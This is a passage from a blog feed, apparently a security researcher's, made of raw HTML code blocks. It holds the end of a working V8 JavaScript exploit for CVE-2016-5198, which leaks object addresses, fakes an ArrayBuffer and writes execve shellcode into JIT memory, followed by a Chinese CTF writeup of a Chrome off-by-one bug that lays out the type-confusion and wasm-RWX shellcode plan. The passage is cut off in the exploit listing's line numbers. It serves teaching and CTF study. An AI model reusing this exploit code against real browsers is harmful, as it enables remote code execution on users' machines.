class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line"><span class="keyword">var</span> m;</span><br><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print("0x"+u2d(3.4766863919133141e-308;</span></span><br><span class="line"><span class="comment">// print(d2u(0x0019000400007300/0x100000000,0x0019000400007300&amp;0xffffffff));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span>     <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    m.xyz3 = addr </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// JIT优化</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">    Ctor2();</span><br><span class="line">    Ctor3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">10000</span>; ++i) &#123;</span><br><span class="line">    Check(<span class="literal">null</span>);</span><br><span class="line">    Check2(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">    Check3(<span class="number">3.4766863919152113e-308</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Ctor2(); <span class="comment">// 初始化m</span></span><br><span class="line">Ctor3(); <span class="comment">// 初始化l</span></span><br><span class="line">print(<span class="string">"jsset is :"</span>);</span><br><span class="line">%DebugPrint(n);</span><br><span class="line"><span class="comment">// %DebugPrint(Check);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点</span></span><br><span class="line">Check(ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">var</span> ab_len_ptr = ab_addr+<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">ab_len_ptr_float = d2u(ab_len_ptr/<span class="number">0x100000000</span>,ab_len_ptr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">Check(evil_f);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line"><span class="keyword">var</span> func_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+func_addr.toString(<span class="number">16</span>));</span><br><span class="line">func_addr = func_addr - <span class="number">1</span>;</span><br><span class="line">func_addr_float = d2u(func_addr/<span class="number">0x100000000</span>,func_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// %DebugPrint(Check2);</span></span><br><span class="line"><span class="comment">// read(1);//插入断点                 </span></span><br><span class="line"></span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Check3(func_addr_float);</span><br><span class="line"></span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br><span class="line"></span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;case-study-cve-2016-5198&quot;&gt;&lt;a href=&quot;#case-study-cve-2016-5198&quot; class=&quot;headerlink&quot; title=&quot;case study:cve-2016-5198&quot;&gt;&lt;/a&gt;case study:cve
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>star ctf chrome oob writeup</title>
    <link href="http://eternalsakura13.com/2019/04/29/*ctf_oob/"/>
    <id>http://eternalsakura13.com/2019/04/29/*ctf_oob/</id>
    <published>2019-04-29T03:51:56.101Z</published>
    <updated>2019-05-01T07:12:37.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="star-ctf-chrome-oob-writeup"><a href="#star-ctf-chrome-oob-writeup" class="headerlink" title="star ctf chrome oob writeup"></a>star ctf chrome oob writeup</h1><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();<span class="comment">//check len&lt;=2,else return undefine</span></span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));----&gt;length off by one</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());----&gt;length off by one</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><p>可以看到在length这里有一个off-by-one</p><p>另外，这里有一个非预期的UAF，其实在Object::ToNumber(isolate, args.at<object>(1)))可以触发回调，通过valueof或者Symbol.toPrimitive可以在这里将array的length改成0之后强制GC将其回收掉，然后重新喷内存占位，由于我们之前缓存了length，可以一开始用一个非常大的length，而此时占位的array是我们可控的，可以占位一个length比较小的array，于是就可以任意OOB，而不是off by one。<br>类似的做法参考CVE-2017-5053，应该也是可以这么利用的，我没做太多尝试，有兴趣的同学可以试一下，不过显然这种做法会非常不稳定。</object></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>v8通过map来判断类型，通过off-by-one来修改map即可产生type confusion</p><h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h3><p>通过splice控制array的内存排布紧邻。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> b = [&#123;&#125;, &#123;&#125;, ab, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//布局内存，让array连续存放</span></span><br><span class="line">a = a.splice(<span class="number">0</span>);</span><br><span class="line">b = b.splice(<span class="number">0</span>);</span><br><span class="line">c = c.splice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>test如下：<br>可以看到如图所示的内存布局：<br>a elements的length位置存放的就是a obj的map了，于是a.oob(xxx)就可以将a的map给覆盖掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//0x33a1055ce0e1-&gt;0x33a1055ce0b1</span><br><span class="line">//0x33a1055ce139-&gt;0x33a1055ce101</span><br><span class="line">//0x33a1055ce191-&gt;0x33a1055ce159</span><br><span class="line"></span><br><span class="line">// x/60gx 0x33a1055ce0b1-1</span><br><span class="line">// 0x33a1055ce0b0: &#123;0x000033a10f4814f9 0x0000000400000000-&gt;a elements</span><br><span class="line">// 0x33a1055ce0c0: 0x3ff199999999999a 0x3ff199999999999a</span><br><span class="line">// 0x33a1055ce0d0: 0x3ff199999999999a 0x3ff199999999999a&#125;</span><br><span class="line">// 0x33a1055ce0e0: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;a obj</span><br><span class="line">// 0x33a1055ce0f0: 0x000033a1055ce0b1 0x0000000400000000&#125;</span><br><span class="line">// 0x33a1055ce100: &#123;0x000033a10f480801 0x0000000500000000-&gt;b elements</span><br><span class="line">// 0x33a1055ce110: 0x000033a1055cdfc9 0x000033a1055ce001</span><br><span class="line">// 0x33a1055ce120: 0x000033a1055cdf01 0x000033a12d09f3f9</span><br><span class="line">// 0x33a1055ce130: 0x000033a12d09f409&#125;</span><br><span class="line">//                                    &#123;0x000033a14e0c2f79-&gt;b obj</span><br><span class="line">// 0x33a1055ce140: 0x000033a10f480c71 0x000033a1055ce101</span><br><span class="line">// 0x33a1055ce150: 0x0000000500000000&#125;</span><br><span class="line">//                                    &#123;0x000033a10f4814f9-&gt;c elements</span><br><span class="line">// 0x33a1055ce160: 0x0000000500000000 0x400a666666666666</span><br><span class="line">// 0x33a1055ce170: 0x400a666666666666 0x400a666666666666</span><br><span class="line">// 0x33a1055ce180: 0x400a666666666666 0x400a666666666666&#125;</span><br><span class="line">// 0x33a1055ce190: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;c obj</span><br><span class="line">// 0x33a1055ce1a0: 0x000033a1055ce159 0x0000000500000000&#125;</span><br><span class="line">// 0x33a1055ce1b0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">// 0x33a1055ce1c0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">// 0x33a1055ce1d0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br></pre></td></tr></table></figure></p><h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>在要fake的arraybuffer的前后两次gc，使其内存分布更稳定。</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>调试的话，直接在对应版本的v8 release上调试，然后写到html里，放到chrome里就行了，偏移什么的都没有改变。<br>也可以直接gdb attach到chrome里调试。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>利用思路非常简单<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>我的exp写的比较dirty。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span 